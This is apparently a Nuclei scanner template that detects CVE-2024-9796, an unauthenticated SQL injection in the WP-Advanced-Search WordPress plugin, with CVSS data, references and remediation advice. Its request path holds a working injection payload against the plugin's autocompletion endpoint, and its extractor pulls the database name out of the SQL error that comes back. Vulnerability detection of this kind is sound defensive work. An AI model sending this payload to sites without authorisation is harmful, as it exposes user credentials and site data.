http:
- extractors:
  - name: database_name
    part: body
    regex:
    - ([a-zA-Z0-9_]+)\.wp_users
    type: regex
  matchers:
  - part: body
    regex:
    - Table '([a-zA-Z0-9_]+)\.wp_users' doesn't exist
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type=&e'
id: CVE-2024-9796
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-9796
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98947
    epss-score: 0.77778
  description: 'The WordPress WP-Advanced-Search plugin for WordPress is vulnerable
    to SQL Injection in all versions up to, and including, 3.3.9 due to insufficient
    escaping on the user supplied parameter and lack of sufficient preparation on
    the existing SQL query. This makes it possible for unauthenticated attackers to
    append additional SQL queries into already existing queries that can be used to
    extract sensitive information from the database.

    '
  impact: 'Unauthenticated attackers can exploit SQL injection through the autocompletion
    endpoint to extract sensitive database information including user credentials,
    posts, comments, and configuration data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-advanced-search/"
    framework: wordpress
    max-request: 1
    product: wp-advanced-search
    vendor: mathieu_chartier
    verified: true
  name: WordPress WP-Advanced-Search <= 3.3.9 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/
  - https://github.com/RandomRobbieBF/CVE-2024-9796
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9796
  remediation: 'Update WP-Advanced-Search plugin to a version later than 3.3.9 that
    properly escapes user supplied parameters and uses prepared SQL statements in
    autocompletion-PHP5.5.php.

    '
  severity: critical
  tags: cve,cve2024,wp,wordpress,wp-plugin,sqli,wp-advanced-search,vuln
